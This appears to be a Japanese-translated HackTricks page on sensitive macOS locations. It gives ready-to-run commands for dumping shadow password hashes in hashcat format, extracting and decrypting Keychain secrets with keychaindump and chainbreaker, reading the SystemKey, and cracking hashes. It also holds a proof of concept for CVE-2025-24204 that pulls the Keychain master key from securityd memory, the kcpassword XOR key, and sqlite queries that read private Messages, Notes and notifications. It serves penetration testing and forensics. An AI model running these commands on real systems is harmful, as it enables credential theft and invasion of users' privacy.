# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Passwords

### Shadow Passwords

Shadow passwordは、**`/var/db/dslocal/nodes/Default/users/`**にある、ユーザー設定を含むplistに保存されています。\
次のonelinerを使用すると、**ユーザーに関するすべての情報**（hash情報を含む）をdumpできます：
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**このようなスクリプト**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)や[**こちらのスクリプト**](https://github.com/octomagon/davegrohl.git)を使用して、hashを**hashcat形式**に変換できます。

macOS PBKDF2-SHA512用のhashcat形式`-m 7100`で、すべての非サービスアカウントのcredsをdumpする別のone-liner:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
ユーザーの `ShadowHashData` を取得する別の方法は、`dscl` を使用することです: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

このファイルは、システムが **single-user mode** で起動している場合にのみ使用されます（そのため、使用頻度はあまり高くありません）。

### Keychain Dump

security binary を使用して**復号された passwords を dump**する場合、ユーザーにこの操作を許可するよう求めるプロンプトが複数回表示されることに注意してください。
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
現代の macOS では、最も興味深い backing store は通常 **`~/Library/Keychains/login.keychain-db`** と **`/Library/Keychains/System.keychain`** です。これらは SQLite-backed files ですが、plaintext へのアクセスは依然として **`securityd`** によって仲介されます。raw DB を盗んでも、ユーザーの password、`SystemKey`、またはメモリ上の master key も回収しない限り、主に metadata と暗号化された blob しか得られません。<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> このコメント [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) に基づくと、これらの tools は Big Sur ではもう動作しないようです。

### Keychaindump の概要

**keychaindump** という tool は、macOS keychain から passwords を抽出するために開発されましたが、[discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) で示されているように、Big Sur などの新しい macOS versions では制限があります。**keychaindump** を使用するには、attacker はアクセスを取得し、**root** へ privilege escalation する必要があります。この tool は、利便性のため、user login 時に keychain がデフォルトで unlock され、applications が user の password を繰り返し要求せずにアクセスできるという事実を悪用します。ただし、user が使用後に毎回 keychain を lock するよう設定している場合、**keychaindump** は効果を発揮しません。

**Keychaindump** は、Apple が authorization および cryptographic operations 用の daemon と説明している **`securityd`** という特定の process を target にします。この process は keychain へのアクセスに不可欠です。extraction process では、user の login password から派生した **Master Key** を特定します。この key は keychain file を読み取るために必要です。**Master Key** を見つけるため、**keychaindump** は `vmmap` command を使用して **`securityd`** の memory heap を scan し、`MALLOC_TINY` として flag された領域内から potential keys を探します。これらの memory locations を調査するには、次の command を使用します。
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
潜在的なマスターキーを特定した後、**keychaindump** はヒープ内を検索し、マスターキーの候補を示す特定のパターン（`0x0000000000000018`）を探します。このキーを利用するには、**keychaindump** のソースコードで説明されているように、デオブファスケーションを含む追加の手順が必要です。この分野を調査するアナリストは、keychain の復号に必要な重要なデータが **securityd** プロセスのメモリ内に保存されていることに注意してください。**keychaindump** を実行するコマンドの例は次のとおりです：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) は、フォレンジック上適切な方法で OSX keychain から以下の種類の情報を抽出するために使用できます。

- [hashcat](https://hashcat.net/hashcat/) または [John the Ripper](https://www.openwall.com/john/) で cracking するのに適した、ハッシュ化された Keychain パスワード
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Keychain の unlock password、[volafox](https://github.com/n0fate/volafox) または [volatility](https://github.com/volatilityfoundation/volatility) を使用して取得した master key、あるいは SystemKey などの unlock file がある場合、Chainbreaker は平文パスワードも提供します。

これらの Keychain の unlock 方法のいずれも使用しない場合、Chainbreaker は利用可能なその他すべての情報を表示します。

#### **キーチェーンキーをダンプする**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKeyでkeychain keys（password付き）をdump**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **keychainキーをDumpする（パスワード付き）hashをcrackする**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **メモリダンプを使用してKeychainキー（パスワード付き）をDump**

**memory dump**を実行するには、[これらの手順に従ってください](../index.html#dumping-memory-with-osxpmem)。
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **ユーザーのパスワードを使って keychain keys（パスワード付き）を dump する**

ユーザーのパスワードを知っている場合、それを使用して**ユーザーに属する keychain を dump して復号**できます。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement による Keychain master key の取得（CVE-2025-24204）

macOS 15.0（Sequoia）には、**`com.apple.system-task-ports.read`** entitlement 付きで `/usr/bin/gcore` が同梱されていたため、任意の local admin（または悪意のある署名済みアプリ）が、SIP/TCC が適用されていても**任意のプロセスのメモリをダンプ**できました。`securityd` をダンプすると **Keychain master key** が平文で漏洩し、ユーザーパスワードなしで `login.keychain-db` を復号できます。<sup>[[1]](#references)</sup>

**脆弱なビルド（15.0–15.2）での簡単な再現:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
抽出した hex key を Chainbreaker（`--key <hex>`）に渡して、login keychain を復号します。Apple は **macOS 15.3+** で entitlement を削除したため、これはパッチ未適用の Sequoia ビルド、または脆弱なバイナリを保持しているシステムでのみ機能します。

### kcpassword

**kcpassword** ファイルには **ユーザーの login password** が保存されていますが、これはシステム所有者が **automatic login** を**有効にしている**場合に限られます。そのため、ユーザーは password の入力を求められることなく自動的にログインされます（あまり安全ではありません）。

password は **`/etc/kcpassword`** に、キー **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** で XOR された状態で保存されます。ユーザーの password がキーより長い場合、キーは再利用されます。\
これにより password は比較的簡単に復元できます。例えば、[**このスクリプト**](https://gist.github.com/opshope/32f65875d45215c3677d) のような scripts を使用します。

## Databases 内の興味深い情報

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

**Sequoia** より前では、通常、Notification Center の store は **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** にあります。**Sequoia+** では、Apple がこれを TCC-protected な group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** に移動しました。

最も興味深い情報の多くは **blob** columns 内に保存されているため、その内容を抽出し、人間が読める形式（`plutil -p -`、`strings`、または小規模な parser）に変換する必要があります。Quick triage の例：
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### 最近のプライバシー問題（NotificationCenter DB）

- macOS **14.7–15.1** では、Apple は適切な redaction を行わずに `db2/db` SQLite 内へ banner content を保存していました。CVE **CVE-2024-44292/44293/40838/54504** により、任意の local user が DB を開くだけで、他の users の notification text を読み取ることができました（TCC prompt なし）。<sup>[[3]](#references)</sup>
- Apple は、新しい Sequoia build で DB を `group.com.apple.usernoted` 内へ移動し、TCC によって保護することでこの問題を緩和しました。そのため、current system では通常、読み取るには適切な user context または TCC bypass が必要です。<sup>[[4]](#references)</sup>
- legacy endpoint では、artefacts を保持したい場合、update または reboot の前に `db`、`db-wal`、`db-shm` files をまとめて copy してください。

### Notes

Users の **notes** は `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` にあります。
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
上記の one-liner の出力が多すぎる場合は、`ZICNOTEDATA.ZDATA` を export して gunzip し、protobuf を parse してください。これは SQLite に対して直接 `strings` を実行するより、通常は信頼性が高くなります。

### Background Tasks / Login Items

**Ventura** 以降、ユーザーが承認した login items と複数の background tasks は、**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** や、バージョン管理された system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** などの **BTM** stores に記録されます。

これらのファイルは、persistence、helper tools、そして一部の MDM-managed background items をすばやく特定するのに役立ちます。
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Persistence の観点と BTM internals については、[auto-start locations のページ](../../macos-auto-start-locations.md#login-items) と [Background Tasks Management の notes](../macos-security-protections/README.md#background-tasks-management) を確認してください。

## Preferences

macOS の apps では Preferences は **`$HOME/Library/Preferences`** にあり、iOS では `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` にあります。

macOS では cli tool **`defaults`** を使用して **Preferences file を modify** できます。

**`/usr/sbin/cfprefsd`** は XPC services `com.apple.cfprefsd.daemon` と `com.apple.cfprefsd.agent` を claim し、Preferences の modify などの actions を実行するために call できます。

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` file には node attributes に適用される permissions が含まれており、SIP によって保護されています。\
この file は uid ではなく UUID によって特定の users に permissions を grant し、`ShadowHashData`、`HeimdalSRPKey`、`KerberosKeys` などの特定の sensitive information に access できるようにします。
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## システム通知

### Darwin 通知

通知を処理する主要な daemon は **`/usr/sbin/notifyd`** です。通知を受信するには、クライアントは `com.apple.system.notification_center` Mach port を介して登録する必要があります（`sudo lsmp -p <pid notifyd>` で確認できます）。daemon はファイル `/etc/notify.conf` で設定可能です。

通知に使用される名前は一意の reverse DNS 表記であり、そのいずれかに通知が送信されると、それを処理できることを示したクライアントが受信します。

`notifyd` プロセスに SIGUSR2 シグナルを送信し、生成されたファイル `/var/run/notifyd_<pid>.status` を読み取ることで、現在のステータス（およびすべての名前）をダンプできます。
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**（メインバイナリは **`/usr/sbin/distnoted`**）は、通知を送信するもう1つの方法です。いくつかの XPC services を公開しており、クライアントの検証を試みるためのチェックを実行します。

### Apple Push Notifications (APN)

この場合、アプリケーションは **topics** に登録できます。クライアントは **`apsd`** を介して Apple のサーバーに接続し、token を生成します。\
その後、providers も token を生成し、Apple のサーバーに接続してクライアントへメッセージを送信できるようになります。これらのメッセージは **`apsd`** によってローカルで受信され、通知を待機しているアプリケーションへ中継されます。

preferences は `/Library/Preferences/com.apple.apsd.plist` にあります。

macOS では `/Library/Application\ Support/ApplePushService/aps.db` に、iOS では `/var/mobile/Library/ApplePushService` に、メッセージのローカルデータベースがあります。そこには `incoming_messages`、`outgoing_messages`、`channel` の3つのテーブルがあります。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
以下を使用して、daemon と connections に関する情報を取得することもできます。
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

これらは、ユーザーが画面上で確認する通知です。

- **`CFUserNotification`**: これらの API は、メッセージ付きのポップアップを画面上に表示する方法を提供します。
- **The Bulletin Board**: iOS で、表示後に消え、Notification Center に保存されるバナーを表示します。
- **`NSUserNotificationCenter`**: これは MacOS における iOS の bulletin board です。古い macOS リリースでは、データベースは通常 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` にあります。Sequoia 以降では `~/Library/Group Containers/group.com.apple.usernoted/db2/db` に移動されました。

## References

- [1] [HelpNetSecurity – macOS gcore entitlement による Keychain master key の抽出が可能 (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple、macOS Sequoia の Notification Center データベースをめぐるプライバシー上の懸念に対応](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
